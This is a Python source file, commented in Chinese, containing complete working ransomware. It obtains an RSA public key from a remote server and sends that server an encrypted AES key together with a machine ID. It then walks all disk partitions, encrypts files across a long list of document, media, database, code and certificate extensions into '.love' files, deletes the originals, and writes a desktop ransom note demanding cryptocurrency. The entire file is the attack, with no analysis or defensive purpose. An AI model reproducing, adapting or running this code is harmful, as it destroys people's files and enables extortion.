# -*- coding: utf-8 -*-

from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
import binascii
import base64
import requests
import os
import psutil

# 生成16字节（128位）的随机字节序列作为AES ECB模式的密钥
keyg = get_random_bytes(16)
zkey = binascii.hexlify(keyg)




def AES_encode(file):
    # 创建AES ECB模式的加密器
    cipher = AES.new(keyg, AES.MODE_ECB)

    # 打开要加密的二进制文件，并读取其内容
    with open(file, 'rb') as files:
        data = files.read()

    # 计算需要填充的字节数
    padding_size = AES.block_size - (len(data) % AES.block_size)

    # 进行PKCS7填充
    padded_data = data + bytes([padding_size] * padding_size)

    # 将填充后的数据分块进行加密
    encrypted_data = cipher.encrypt(padded_data)

    # 将加密后的数据写入到输出文件中
    newfile = os.path.dirname(str(file)) + '\\' + os.path.basename(str(file)) + ".love"
    with open(newfile, 'wb') as file:
        file.write(encrypted_data)


def reqkey(url):
    pub_key = requests.get(url)
    if pub_key.status_code == 200:
        print("公钥获取成功")
        public_key_bytes = pub_key.content
        public_key = serialization.load_pem_public_key(
            public_key_bytes,
            backend=default_backend()
        )
        decrypted_text = public_key.encrypt(
            zkey,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        return decrypted_text


# AES_encode('1.txt',key)
def mac_info():
    import hashlib
    import platform
    import uuid
    mac_address = ':'.join(hex(uuid.getnode())[2:].zfill(12)[i:i + 2] for i in range(0, 12, 2))

    # 获取CPU信息
    processor = platform.processor()

    # 生成唯一字符串
    unique_string = mac_address + processor

    # 计算SHA256哈希值
    hash_object = hashlib.sha256(unique_string.encode())
    unique_hash = hash_object.hexdigest()

    return unique_hash


def create_file(info):
    strinfo = """ 
    你的电脑数据已被加密

    想要解密数据请支付赎金并提供你的电脑ID
    
    虚拟货币地址：xxxxxxxxxxxx

    你的电脑ID为：{}    
    """.format(info)
    desktop_path = os.path.expanduser("~/Desktop")

    # 新文件的名称和路径
    file_name = "勒索信息.txt"
    file_path = os.path.join(desktop_path, file_name)

    # 创建新文件
    with open(file_path, "w", encoding="utf8") as file:
        file.write(strinfo)


def traverse_files(folder_path):
    allowed_extensions = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pst', '.ost', '.msg', '.eml', '.vsd',
                          '.vsdx', '.txt', '.csv', '.rtf', '.123', '.wks', '.wk1', '.pdf', '.dwg', '.onetoc2', '.snt',
                          '.jpeg', '.jpg', '.docb', '.docm', '.dot', '.dotm', '.dotx', '.xlsm', '.xlsb', '.xlw', '.xlt',
                          '.xlm', '.xlc', '.xltx', '.xltm', '.pptm', '.pot', '.pps', '.ppsm', '.ppsx', '.ppam', '.potx',
                          '.potm', '.edb', '.hwp', '.602', '.sxi', '.sti', '.sldx', '.sldm', '.sldm', '.vdi', '.vmdk',
                          '.vmx', '.gpg', '.aes', '.ARC', '.PAQ', '.bz2', '.tbk', '.bak', '.tar', '.tgz', '.gz', '.7z',
                          '.rar', '.zip', '.backup', '.iso', '.vcd', '.bmp', '.png', '.gif', '.raw', '.cgm', '.tif',
                          '.tiff', '.nef', '.psd', '.ai', '.svg', '.djvu', '.m4u', '.m3u', '.mid', '.wma', '.flv',
                          '.3g2', '.mkv', '.3gp', '.mp4', '.mov', '.avi', '.asf', '.mpeg', '.vob', '.mpg', '.wmv',
                          '.fla', '.swf', '.wav', '.mp3', '.sh', '.class', '.jar', '.java', '.rb', '.asp', '.php',
                          '.jsp', '.brd', '.sch', '.dch', '.dip', '.pl', '.vb', '.vbs', '.ps1', '.bat', '.cmd', '.js',
                          '.asm', '.h', '.pas', '.cpp', '.c', '.cs', '.suo', '.sln', '.ldf', '.mdf', '.ibd', '.myi',
                          '.myd', '.frm', '.odb', '.dbf', '.db', '.mdb', '.accdb', '.sql', '.sqlitedb', '.sqlite3',
                          '.asc', '.lay6', '.lay', '.mml', '.sxm', '.otg', '.odg', '.uop', '.std', '.sxd', '.otp',
                          '.odp', '.wb2', '.slk', '.dif', '.stc', '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds',
                          '.uot', '.stw', '.sxw', '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx',
                          '.der']

    for root, dirs, files in os.walk(folder_path):
        for file in files:
            # Get file extension
            ext = os.path.splitext(file)[1]
            # Check if in allowed list
            if ext in allowed_extensions:
                filename = os.path.join(root, file)
                try:
                    AES_encode(filename)
                    print('Encrypted: ' + filename)
                    os.remove(filename)
                except Exception as e:
                    print('Error: ' + str(e))
                    print('Error: ' + filename)
                    pass


def get_all_disk_partitions():
    partitions = []
    for partition in psutil.disk_partitions(all=True):
        if partition.fstype:
            partitions.append(partition.device)
    return partitions


def send_key(url, key):
    key = base64.urlsafe_b64encode(key).decode()
    macinfo = mac_info()
    data = "mac=" + macinfo + "&key=" + key
    headers = {'Content-type': 'application/x-www-form-urlencoded; charset=utf-8'}
    res = requests.post(url, data=data, headers=headers)
    if "Data insertion successful" in res.text:
        print("Key sent successfully")
        disk_partitions = get_all_disk_partitions()
        for partition in disk_partitions:
            traverse_files(partition)

        create_file(macinfo)
    else:
        print("Error sending key")


key = reqkey("http://10.21.69.127:5000/getkey")
send_key("http://10.21.69.127:5000/api", key)
